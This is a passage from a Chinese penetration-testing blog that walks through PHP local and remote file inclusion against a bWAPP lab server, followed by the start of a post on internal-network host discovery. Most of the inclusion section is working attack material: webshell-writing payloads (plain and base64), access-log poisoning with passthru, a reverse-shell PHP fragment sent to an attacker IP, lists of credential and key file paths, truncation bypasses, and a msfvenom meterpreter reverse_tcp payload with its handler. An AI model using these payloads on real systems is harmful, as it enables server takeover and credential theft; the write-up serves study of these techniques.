+<p>0x02 php本地包含简单利用过程[LFI]:</p>
+<p>1), 搜集各种目标服务器的各种敏感路径,后面可能会利用到这些,这里写的不全,有整理好的fuzzdb,大家可以参考那个:</p>
+<p>win 各类敏感文件路径<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">c:<span class="symbol">\W</span>INDOWS<span class="symbol">\s</span>ystem32<span class="symbol">\e</span>ula.txt</div><div class="line">c:<span class="symbol">\b</span>oot.ini  </div><div class="line">c:<span class="symbol">\W</span>INDOWS<span class="symbol">\w</span>in.ini  </div><div class="line">c:<span class="symbol">\W</span>INNT<span class="symbol">\w</span>in.ini  </div><div class="line">c:<span class="symbol">\W</span>INDOWS<span class="symbol">\R</span>epair<span class="symbol">\S</span>AM  </div><div class="line">c:<span class="symbol">\W</span>INDOWS<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\W</span>INNT<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\P</span>rogram Files<span class="symbol">\A</span>pache Group<span class="symbol">\A</span>pache<span class="symbol">\c</span>onf<span class="symbol">\h</span>ttpd.conf  </div><div class="line">c:<span class="symbol">\P</span>rogram Files<span class="symbol">\A</span>pache Group<span class="symbol">\A</span>pache2<span class="symbol">\c</span>onf<span class="symbol">\h</span>ttpd.conf  </div><div class="line">c:<span class="symbol">\P</span>rogram Files<span class="symbol">\x</span>ampp<span class="symbol">\a</span>pache<span class="symbol">\c</span>onf<span class="symbol">\h</span>ttpd.conf  </div><div class="line">c:<span class="symbol">\p</span>hp<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\p</span>hp5<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\p</span>hp4<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\a</span>pache<span class="symbol">\p</span>hp<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\x</span>ampp<span class="symbol">\a</span>pache<span class="symbol">\b</span>in<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\h</span>ome2<span class="symbol">\b</span>in<span class="symbol">\s</span>table<span class="symbol">\a</span>pache<span class="symbol">\p</span>hp.ini  </div><div class="line">c:<span class="symbol">\h</span>ome<span class="symbol">\b</span>in<span class="symbol">\s</span>table<span class="symbol">\a</span>pache<span class="symbol">\p</span>hp.ini</div><div class="line">c:<span class="symbol">\P</span>rogram Files<span class="symbol">\A</span>pache Group<span class="symbol">\A</span>pache<span class="symbol">\l</span>ogs<span class="symbol">\a</span>ccess.log  </div><div class="line">c:<span class="symbol">\P</span>rogram Files<span class="symbol">\A</span>pache Group<span class="symbol">\A</span>pache<span class="symbol">\l</span>ogs<span class="symbol">\e</span>rror.log</div></pre></td></tr></table></figure></p>
+<p>linux 各类敏感路径:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">/var/log/apache2/access.log</div><div class="line">/etc/httpd/logs/acces_log </div><div class="line">/etc/httpd/logs/error_log </div><div class="line">/var/www/logs/access_log </div><div class="line">/var/www/logs/access.log </div><div class="line">/usr/local/apache/logs/access_ log </div><div class="line">/usr/local/apache/logs/access. log </div><div class="line">/var/log/apache/access_log </div><div class="line">/var/log/apache2/access_log </div><div class="line">/var/log/apache/access.log </div><div class="line">/var/log/access_log</div><div class="line">../apache/logs/error.log</div><div class="line">../apache/logs/access.log</div><div class="line">../../apache/logs/error.log</div><div class="line">../../apache/logs/access.log</div><div class="line">../../../apache/logs/error.log</div><div class="line">../../../apache/logs/access.log</div><div class="line">../../../../../../../etc/httpd/logs/acces_log</div><div class="line">../../../../../../../etc/httpd/logs/acces.log</div><div class="line">../../../../../../../etc/httpd/logs/error_log</div><div class="line">../../../../../../../etc/httpd/logs/error.log</div><div class="line">../../../../../../../var/www/logs/access_log</div><div class="line">../../../../../../../var/www/logs/access.log</div><div class="line">../../../../../../../usr/local/apache/logs/access_ log</div><div class="line">../../../../../../../usr/local/apache/logs/access. log</div><div class="line">../../../../../../../var/log/apache/access_log</div><div class="line">../../../../../../../var/log/apache2/access_log</div><div class="line">../../../../../../../var/log/apache/access.log</div><div class="line">../../../../../../../var/log/apache2/access.log</div><div class="line">../../../../../../../var/log/access_log</div><div class="line">../../../../../../../var/log/access.log</div><div class="line">../../../../../../../var/www/logs/error_log</div><div class="line">../../../../../../../var/www/logs/error.log</div><div class="line">../../../../../../../usr/local/apache/logs/error_l og</div><div class="line">../../../../../../../usr/local/apache/logs/error.l og</div><div class="line">../../../../../../../var/log/apache/error_log</div><div class="line">../../../../../../../var/log/apache2/error_log</div><div class="line">../../../../../../../var/log/apache/error.log</div><div class="line">../../../../../../../var/log/apache2/error.log</div><div class="line">../../../../../../../var/log/error_log</div><div class="line">../../../../../../../var/log/error.log</div></pre></td></tr></table></figure></p>
+<p>高权限的情况下,可以先顺便看看目标系统的各类系统配置文件,说不定在这里就已经有收获了,如下:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">/proc/mounts</div><div class="line">/proc/net/arp</div><div class="line">/proc/net<span class="built_in">/route</span></div><div class="line">/proc/net/tcp</div><div class="line">/proc/net/udp</div><div class="line">/proc/net/fib_trie</div><div class="line">/proc/version</div><div class="line">/proc/self/environ</div><div class="line">c:\WINDOWS\TEMP\  </div><div class="line">c:\php\sessions\  </div><div class="line">c:\php5\sessions\  </div><div class="line">c:\php4\sessions\</div><div class="line">/etc/issue</div><div class="line">/etc/motd</div><div class="line">/etc/passwd </div><div class="line">/etc<span class="built_in">/group </span></div><div class="line">/etc/resolv.conf</div><div class="line">/etc/shadow</div><div class="line">.htaccess</div><div class="line">config.php</div><div class="line">authorized_keys</div><div class="line">id_rsa</div><div class="line">id_rsa.keystore</div><div class="line">id_rsa.pub</div><div class="line">known_hosts</div><div class="line">.bash_history</div><div class="line">.mysql_history</div><div class="line">.my.cnf</div></pre></td></tr></table></figure></p>
+<p>2),选择要包含的对象:</p>
+<p>普通权限下的包含:</p>
+<p>利用php的各种伪协议[主要是控制文件流输出即<code>写文件</code>,可能你还要对你所要写的那个目录有写权限才行] ,利用条件[这些信息全部可以在phpinfo中看到]:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">小于5.0 即使<span class="attribute">allow_url_include</span>=Off 可用</div><div class="line">大于5.0 只有<span class="attribute">allow_url_fopen</span>=on才能用</div></pre></td></tr></table></figure></p>
+<p><img src="/img/include phpinfo.png" alt=""><br><img src="/img/include phpinfo inluce.png" alt=""><br><img src="/img/include phpinfo gpc.png" alt=""></p>
+<p>利用 php://input 写shell<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.3.10/bWAPP/rlfi.php?language=php://input&amp;action=go</div><div class="line">POST: &lt;?php fputs(fopen("HELPS.php","a"),'&lt;?php $sl = create_function("", @$_REQUEST["request"]);$sl();?&gt;') ?&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/img/include  input.png" alt=""><br><img src="/img/include  input res.png" alt=""></p>
+<p>利用 data: 写shell<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php fputs(fopen(<span class="string">"HELPS.php"</span>,<span class="string">"a"</span>),<span class="string">'&lt;?php $sl = create_function("", @$_REQUEST["sec"]);$sl();?&gt;'</span>) ?&gt;  编码前的webshell</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">data:</span>text/plain,&lt;?php fputs(fopen(<span class="string">"infos.php"</span>,<span class="string">"a"</span>),<span class="string">'&lt;?php $sl = create_function("", @$_REQUEST["klionsec"]);$sl();?&gt;'</span>) ?&gt;&amp;action=go</div></pre></td></tr></table></figure></p>
+<p><img src="/img/include data.png" alt=""><br><img src="/img/include data res.png" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">data:</span>text/plain;base64,PD9waHAgZnB1dHMoZm9wZW4oIkhFTFBTLnBocCIsImEiKSwnPD9waHAgJHNsID0gY3JlYXRlX2Z1bmN0aW9uKCIiLCBAJF9SRVFVRVNUWyJzZWMiXSk7JHNsKCk7Pz4nKSA/Pg==&amp;action=go</div></pre></td></tr></table></figure>
+<p><img src="/img/include data base64.png" alt=""><br><img src="/img/include data base64 res.png" alt=""></p>
+<p>利用 php://filter 读取目标敏感文件 [可以是相对,绝对和远程路径{ftp,http}]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">php:</span>/<span class="regexp">/filter/resource</span>=./admin/settings.php&amp;action=go  最好不要用这个,貌似不能写,读不出来</div></pre></td></tr></table></figure></p>
+<p><img src="/img/include data filter base64.png" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">把读出来的内容base64解码一下,就可以看到明文内容了</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">php:</span>/<span class="regexp">/filter/convert</span>.base64-encode/resource=./admin/settings.php&amp;action=go</div></pre></td></tr></table></figure>
+<p><img src="/img/include data filter base64 res.png" alt=""></p>
+<p>利用 zip:// 传shell<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">zip:</span>/<span class="regexp">/./options</span>.zip%<span class="number">23</span>options&amp;action=go  这里的<span class="comment">#务必要转成url编码后的%23,自己本地测时候不太靠谱</span></div></pre></td></tr></table></figure></p>
+<p>利用 phar:// 原理同上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="symbol">phar:</span>/<span class="regexp">/./ex</span>.phar%<span class="number">23</span>ex&amp;action=go 也不太好使</div></pre></td></tr></table></figure></p>
+<p>利用 expect://ls  可直接执行系统命令,自己多次尝试并未成功,且默认该模块是没有启用的</p>
+<p>尝试把一句话放到user-agent或者请求里面 [注意编码,用burp拦下改过来或者直接用nc就好了],然后想办法去包含目标的web访问日志文件<br>前提是你要找到这些日志文件的物理路径才行],另外,还有一点需要说明下,对于一些正常企业的web服务器来讲,他们的日志一般都是按日期切割保存的,即使被你侥幸猜到了访问日志的文件名,但单个日志文件也仍然是比较大的,显然,这时再去包含日志就很不明智了<br>说这个,并不是想说这种方法不管用,实际渗透你要按你自己目标的实际情况来,对了,顺便再补充一句,虽然,访问日志的文件很大,但你还可以包含错误日志呀<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nc 192.168.3.10 80</span></div><div class="line">  GET /&lt;?php passthru($_GET[<span class="string">'cmd'</span>]); ?&gt; HTTP/<span class="number">1.1</span>  这里不一定非要用一句话,你还是尝试把它直接换成一个上传表单或者直接从远程下载webshell也是可以的</div><div class="line">  <span class="symbol">Host:</span> <span class="number">192.168</span>.<span class="number">3.10</span></div><div class="line">  <span class="symbol">Connection:</span> close</div><div class="line">  </div><div class="line">  <span class="symbol">http:</span>/<span class="regexp">/192.168.3.10/b</span>WAPP/rlfi.php?language=<span class="regexp">/var/log</span><span class="regexp">/apache2/access</span>.log&amp;action=go&amp;cmd=w</div></pre></td></tr></table></figure></p>
+<p><img src="/img/include log.png" alt=""><br><img src="/img/include log res.png" alt=""></p>
+<p>跟包含日志差不你也可以把一句话放到user-agent中然后包含/proc/self/environ这个系统环境变量,用法同上,不再赘述</p>
+<p>尝试包含服务端的session文件,想要包含session,你务必要先确定这个session的文件名,不出意外的情况下,这个session文件名应该是PHPSESSID加上’sess_’前缀,一般会被放到下面的这里目录中,另外,利用的时候动作务必要快,因为一个session 如果长时间没动作,很快就会被回收[php自身的垃圾回收机制]<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">可能存放session的一些目录:</div><div class="line"><span class="regexp">/var/lib</span><span class="regexp">/php5/</span></div><div class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">php</span>/</span></div><div class="line">/tmp/</div><div class="line">……</div></pre></td></tr></table></figure></p>
+<p>session 内容一般都是类似下面的这种形式,不过前提是你要能控制这段session才行:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">login|<span class="string">s:</span><span class="number">3</span>:<span class="string">"bee"</span>;admin|<span class="string">s:</span><span class="number">1</span>:<span class="string">"1"</span>;token|<span class="string">s:</span><span class="number">40</span>:<span class="string">"c0c7fa8b6d373ad173fe7d99019a183d3bd3d888"</span>;amount|<span class="string">i:</span><span class="number">1000</span>;</div><div class="line"><span class="string">http:</span><span class="comment">//192.168.3.10/bWAPP/rlfi.php?language=/var/lib/php5/sess_b449542fdbd76c4e860e6ea34a3c46a2&amp;action=go&amp;cmd=id</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/include session.png" alt=""></p>
+<p>包含自己上传到目标机器的的其他文件 [如,图片马(不一定非要用真正的图片马,如果验证不是很严,随便一个shell改下后缀就好了),txt,附件……]<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">3.10</span><span class="regexp">/bWAPP/</span>rlfi.php?language=<span class="regexp">/var/</span>www<span class="regexp">/shell.jpg&amp;action=go&amp;cmd=id</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/include pic shell.png" alt=""></p>
+<p>通过目标邮件来反弹shell [实际渗透中暂时还没尝试过,本地也未成功,后期搞清楚问题在哪里,再更新上来]<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> smtp-user-enum -M VRFY -U /home/weak_wordlist/userall.txt -t 192.168.3.10  先来枚举下目标系统有哪些用户</span></div><div class="line"><span class="meta">#</span><span class="bash"> telnet 192.168.3.10 25</span></div><div class="line">  HELO localhost</div><div class="line">  mail from:&lt;root&gt;</div><div class="line">  rcpt to:&lt;www-data&gt;</div><div class="line">  data</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">  set_time_limit(0);</div><div class="line"><span class="meta">  $</span><span class="bash">VERSION = <span class="string">"1.0"</span>;</span></div><div class="line"><span class="meta">  $</span><span class="bash">ip = <span class="string">"192.168.3.9"</span>;</span></div><div class="line"><span class="meta">  $</span><span class="bash">port = 80;</span></div><div class="line"><span class="meta">  $</span><span class="bash">chunk_size = 1400;</span></div><div class="line"><span class="meta">  $</span><span class="bash">write_a = null;</span></div><div class="line"><span class="meta">  $</span><span class="bash">error_a = null;</span></div><div class="line"><span class="meta">  $</span><span class="bash">shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span></div><div class="line"><span class="meta">  $</span><span class="bash">daemon = 0;</span></div><div class="line"><span class="meta">  $</span><span class="bash">debug = 0;</span></div></pre></td></tr></table></figure></p>
+<p>配合phpinfo来包含,其实也是包含临时文件的一种方法,可惜没有成功,初步估计是脚本的问题,后期手工再试试,成功以后会把过程再更新上来</p>
+<p>0x03 包含时经常会遇到的一些问题<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%<span class="number">00</span> ? 后面拼接有多余的后缀,可利用各种空字节来尝试截断,当然啦,转义开关肯能需要关上, php小于 <span class="number">5.3</span>.<span class="number">4</span>可行</div></pre></td></tr></table></figure></p>
+<p>尝试超长路径截断,在正常的路径后面跟上超长字符,可用.小于5.2.8,如下:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/var/log/apache2/error.log.........................................................................................</div><div class="line">../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../var/log/apache2/error.log</div><div class="line">/var/log/apache2/error.log/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../</div></pre></td></tr></table></figure></p>
+<p>有时候可能会有过滤路径分隔符的问题,可以尝试用%2F代替</p>
+<p>如果后端是类似白名单的检查,就不太好过了,正在学习中……希望表哥们能多多提携</p>
+<p>问题其实还有很多很多,正在学习中,待续……</p>
+<p>0x04 php远程包含[RFI]:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">利用条件:</div><div class="line">allow_url_fopen=On</div><div class="line">allow_url_include=On</div></pre></td></tr></table></figure>
+<p>简要利用过程[基本同上,同样,如果是那种白名单的检查,想过还是比较难的]:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>//<span class="number">192.168</span><span class="meta">.3</span><span class="meta">.10</span>/bWAPP/rlfi.php?language=http://<span class="number">192.168</span><span class="meta">.3</span><span class="meta">.9</span>/phpinfoupload.html&amp;action=go</div></pre></td></tr></table></figure></p>
+<p><img src="/img/remote include.png" alt=""></p>
+<p>0x05 最后,还有一个比较好用的利用方式,就是直接利用msf的php payload 弹回一个meterpreter的shell,有一个功能完备的shell这是我们所期望的:</p>
+<p>先装个小工具,等会儿要用到<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> apt-get install xclip -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">alias</span> pbcopy=<span class="string">'xclip -selection clipboard'</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">alias</span> pbpaste=<span class="string">'xclip -selection clipboard -o'</span></span></div></pre></td></tr></table></figure></p>
+<p>先用msf生成好php的payload,之后稍微处理下<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># msfvenom -<span class="keyword">p</span> php/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">3.9</span> LPORT=<span class="number">53</span> -<span class="keyword">f</span> raw &gt; <span class="keyword">shell</span>.php</div><div class="line"># <span class="keyword">cat</span> <span class="keyword">shell</span>.php | pbcopy &amp;&amp; <span class="keyword">echo</span> <span class="string">'&lt;?php '</span> | <span class="keyword">tr</span> -d <span class="string">'\n'</span> &gt; <span class="keyword">shell</span>.php &amp;&amp; pbpaste &gt;&gt; <span class="keyword">shell</span>.php</div></pre></td></tr></table></figure></p>
+<p><img src="/img/include meterpreter.png" alt=""></p>
+<p>本地监听准备先准备好<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># msfconsole</span></div><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; <span class="builtin-name">set</span> payload php/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; <span class="builtin-name">set</span> lhost 192.168.3.9</div><div class="line">msf exploit(handler) &gt; <span class="builtin-name">set</span> lport 53</div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure></p>
+<p>这时尝试包含我们msf的php shell,访问之后,shell顺利弹回,注意,这期间浏览器会一直处于阻塞状态,直到会话断开,粗略的看了一眼代码,应该是在用php循环的发socket,这个shell应该比菜刀的一句话强多了吧</p>
+<p><img src="/img/include meterpreter meterpreter.png" alt=""><br><img src="/img/include meterpreter access.png" alt=""></p>
+<p>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;以后文章中的所有漏洞利用过程,尽量会全部在本地搭环境重现[其实,实际渗透跟这个也差不太远,主要是可能会出各种各样的问题,仅仅就差那个解决问题的过程没掌握到而已],公开的东西,用实例始终是不太好的,大家谅解哈,关于php包含实际渗透中能用到的,我自己所知道的可能就这些了,希望表哥们能把自己压箱底的家伙都共享出来,小弟好多多学习……<br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/06/25/atived-machine-discovnery/">
+                如何在目标内网中发现更多存活主机 [arp,icmp,tcp/udp,smb,snmp ...]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-06-25</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/pentset/">pentset</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 基于不同平台下的各种arp扫描方法<br>&nbsp;&nbsp;&nbsp;&nbsp;首先,尝试基于arp的各种内网主机发现方式,它可以轻易bypass掉各类应用层防火墙,这是大家都知道的,如果是专业的arp防火墙,呵呵……</p>
+<p>0x02 在win下进行各种arp扫描:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># start /b arpscan.exe -t <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span> &gt;&gt; result.txt</div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_ethnet_arp.png" alt="&#39;&#39;"></p>
+<p>利用powershell脚本进行arp扫描,这也是个人比较推荐的方式,轻量且免杀效果较好,系统自带,灵活方便:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> powershell.exe -<span class="built_in">exec</span> bypass -Command <span class="string">"Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.3.0/24"</span>  &gt;&gt; result.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_ethnet_arp_powershell2.png" alt="&#39;&#39;"></p>
+<p>说到powershell 这里就不得不顺带提下<code>empire</code>,它里面同样提供了用于arp扫描的模块,而且比msf的arp更好用[一款优秀的域内网渗透框架,经常进行win内网渗透的朋友,应该用的非常多,这里就不多说了]:<br><img src="/img/common_arp_empire.jpg" alt="&#39;&#39;"></p>
+<p>使用老旧的nmap,另外在win下使用,可能需要你先装好所需的win运行库和npcap,在安装该库的时候,默认选项即可,注意,如果是在中文系统中安装还有点儿问题,推荐用英文系统,所需的所有依赖库在nmap程序包中都已自带,说实话,个人并不建议直接把nmap丢到目标机器上用,没有图形界面的情况下安装依赖库还是比较麻烦的,另外,如果仅仅是存活扫描,它肯定也不会是首选,起码不是自己的首选:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># nmap -sn -PR  <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span>  以arp的方式扫描</div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_ethnet_arp_nmap.png" alt="&#39;&#39;"></p>
+<p>在cain中也带了arp扫描功能,虽然,工具已经n年没有更新过了,但依然经典,建议在03以下的系统使用,另外,它需要免杀:<br><img src="/img/common_ethnet_arp_cain.png" alt="&#39;&#39;"><br></p>
+<p>0x03 在 linux 下进行 arp 扫描 :<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,在一些主流的linux发型版软件包中已经默认自带了nmap,不过是5.0版本的,一般的运维可能也不会装,所以还是自己动手编译装下吧,这里顺便多一嘴,在目标机器上安装工具,尽量源码编译安装,走的时候,相对容易处理干净:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> wget https://nmap.org/dist/nmap-7.40.tar.bz2</span></div><div class="line"><span class="meta">#</span><span class="bash"> bzip2 -<span class="built_in">cd</span> nmap-7.40.tar.bz2 | tar xvf -</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> nmap-7.40 </span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure  这里可以用--prefix指定安装路径</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $?</span></div><div class="line"><span class="meta">#</span><span class="bash"> make</span></div><div class="line"><span class="meta">#</span><span class="bash"> make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $?</span></div><div class="line"><span class="meta">#</span><span class="bash"> make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $?	</span></div><div class="line"><span class="meta">#</span><span class="bash"> nmap -sn -PR 192.168.3.0/24  尝试arp扫描</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_arp_nmap_win.jpg" alt="&#39;&#39;"></p>
+<p>编译安装arpscan:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> unzip arpscan.zip</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> arpscan</span></div><div class="line"><span class="meta">#</span><span class="bash"> autoreconf --install</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure  工具依赖libpcap库,这里需要先把库装好</span></div><div class="line">     # wget http://www.tcpdump.org/release/libpcap-1.1.1.tar.gz</div><div class="line">     # tar -zxvf libpcap-1.1.1.tar.gz</div><div class="line">     # cd libpcap-1.1.1</div><div class="line">     # ./configure</div><div class="line">     # echo $?</div><div class="line">     # make &amp;&amp; make install</div><div class="line">     # echo $?</div><div class="line">     # cd ..</div><div class="line"><span class="meta">#</span><span class="bash"> ./configure 再次执行检测</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $?</span></div><div class="line"><span class="meta">#</span><span class="bash"> make</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $?</span></div><div class="line"><span class="meta">#</span><span class="bash"> chmod -R 755 ./*  先给下权限,不然执行检测时无法通过</span></div><div class="line"><span class="meta">#</span><span class="bash"> make check</span></div><div class="line"><span class="meta">#</span><span class="bash"> make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $?</span></div><div class="line"><span class="meta">#</span><span class="bash"> arp-scan --interface=eth3 --localnet 扫描指定网卡的网段</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_arp_scan_linux.jpg" alt="&#39;&#39;"></p>
